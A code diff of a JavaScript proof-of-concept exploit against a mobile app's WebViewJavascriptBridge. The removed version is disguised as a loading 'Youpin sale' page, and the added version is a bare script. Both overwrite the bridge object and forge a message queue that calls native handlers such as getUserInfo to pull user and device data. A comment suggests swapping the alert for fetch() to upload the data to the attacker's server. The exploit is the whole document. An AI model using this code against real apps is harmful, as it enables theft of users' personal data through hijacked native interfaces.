@@ -1,48 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <title>有品特卖</title>
-</head>
-<body>
-<h1>加载中</h1>
-
 <script>
 // 1. 触发 Bridge 初始化
 location.href = "wvjbscheme://__BRIDGE_LOADED__";
-
-setTimeout(function () {
-    // 2. 覆盖 Bridge 对象
-    WebViewJavascriptBridge = {
-        _handleMessageFromJava: function (messageJSON) {
-            var data = JSON.parse(messageJSON);
-
-            // ✅ 弹窗展示窃取到的数据
-            alert(
-                "✅ 成功接收到 Java 数据\n\n" +
-                JSON.stringify(data, null, 2)
-            );
-        },
-
-        _fetchQueue: function () {
-            return JSON.stringify([
-                {
-                    handlerName: "getUserInfo",
-                    data: {},
-                    callbackId: "cb_001"
-                },
-                {
-                    handlerName: "getDeviceInfo",
-                    data: {},
-                    callbackId: "cb_002"
-                }
-            ]);
-        }
-    };
-
-    // 3. 触发消息队列处理
-    location.href = "wvjbscheme://__WVJB_QUEUE_MESSAGE__";
-}, 800);
+// 2. 覆盖 Bridge 对象
+WebViewJavascriptBridge = {
+// 接收 Java 端返回的用户信息
+_handleMessageFromJava: function (message) {
+console.log('Received from Java:', message);
+alert(message); // 展示 / 可改为 fetch() 上传到攻击者服务器
+},
+// 伪造消息队列 — 调用 getUserInfo 获取用户敏感信息
+_fetchQueue: function () {
+return '[{"handlerName":"getUserInfo","data":{},"callbackId":""}]';
+}
+};
+// 3. 触发消息处理
+location.href = "wvjbscheme://__WVJB_QUEUE_MESSAGE__";
 </script>
-</body>
-</html>
